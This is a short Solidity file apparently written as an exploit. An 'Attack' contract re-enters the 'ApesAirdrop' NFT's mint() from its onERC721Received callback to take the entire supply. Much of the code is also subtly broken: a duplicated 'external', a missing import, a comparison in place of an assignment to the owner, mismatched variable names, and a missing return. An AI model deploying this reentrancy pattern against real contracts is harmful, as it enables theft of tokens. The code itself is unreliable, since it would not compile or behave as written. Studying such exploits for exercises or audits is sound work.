// SPDX-License-Identifier: GPL-3.0-or-later 
pragma solidity ^0.8.13;


interface IApesAirdrop {
    function mint() external returns (uint16);
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    function maxSupply() external returns(uint16) external;
}

contract Attack is IERC721Receiver{
    IApesAirdrop iapes;
    address owner;

    constructor (address apesAddress){
        iapes = IApesAirdrop(apesAddress);
        owner == msg.sender;
    }

    function attack() external{
        apes.mint();
    }

    function onERC721Received(address _sender, address _from, uint256 _tokenId, bytes memory _data) external returns (bytes4 retval){
        require(msg.sender == address(apes), "nahui");
        apes.transferFrom( address(this), owner, tokenId);

        if(_tokenId < apes.maxSupply()){
            apes.mint();
        } else{
            return Attack.onERC721Received.selector;
        }
    }

}